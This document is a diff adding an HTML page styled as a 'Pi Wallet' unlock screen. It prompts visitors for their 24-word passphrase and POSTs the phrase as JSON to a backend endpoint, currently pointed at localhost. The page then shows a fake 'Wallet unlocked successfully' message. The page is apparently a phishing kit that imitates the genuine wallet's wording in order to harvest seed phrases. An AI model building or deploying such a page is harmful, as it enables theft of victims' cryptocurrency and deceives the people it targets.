@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Unlock Pi Wallet</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        margin: 0;
+        padding: 20px;
+        background-color: #f8f8f8;
+      }
+      .container {
+        max-width: 400px;
+        margin: auto;
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+      h2 {
+        color: black;
+      }
+      textarea {
+        width: -webkit-fill-available;
+        height: 100px;
+        padding: 10px;
+        border: 2px solid #8b5cf6;
+        border-radius: 5px;
+        font-size: 16px;
+      }
+      .btn {
+        width: 100%;
+        background-color: #6a42b7;
+        color: white;
+        padding: 10px;
+        border: none;
+        border-radius: 5px;
+        font-size: 16px;
+        margin-top: 10px;
+        cursor: pointer;
+      }
+      .btn:disabled {
+        background-color: #ccc;
+        cursor: not-allowed;
+      }
+      .warning {
+        font-size: 14px;
+        color: #333;
+        margin-top: 20px;
+      }
+      .link {
+        color: #007bff;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h2>Unlock Pi Wallet</h2>
+      <textarea
+        id="passphrase"
+        placeholder="Enter your 24-word passphrase here"
+      ></textarea>
+      <button class="btn" onclick="unlockWallet()">
+        Unlock With Passphrase
+      </button>
+      <button class="btn" disabled>Biometric Not Available</button>
+      <p class="warning">
+        As a non-custodial wallet, your wallet passphrase is exclusively
+        accessible only to you. Recovery of passphrase is currently impossible.
+      </p>
+      <p class="warning">
+        Lost your passphrase?
+        <a href="#" class="link">You can create a new wallet</a>, but all your
+        Pi in your previous wallet will be inaccessible.
+      </p>
+    </div>
+
+    <script>
+      async function unlockWallet() {
+        let passphrase = document.getElementById("passphrase").value.trim();
+        let words = passphrase.split(" ");
+
+        console.log("🚀 ~ unlockWallet ~ words.length:", words.length);
+        if (words.length !== 24) {
+          alert("Invalid passphrase. Make sure you entered all 24 words.");
+          return;
+        }
+
+        try {
+          let response = await fetch("http://localhost:3001/api/v1/password", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ password: passphrase }),
+          });
+
+          let data = await response.json();
+
+          if (!response.error) {
+            passphrase.value = "";
+            alert("Wallet unlocked successfully!");
+          } else {
+            alert("Error: " + data.message);
+          }
+        } catch (error) {
+          alert("Failed to connect to the server.");
+        }
+      }
+    </script>
+  </body>
+</html>
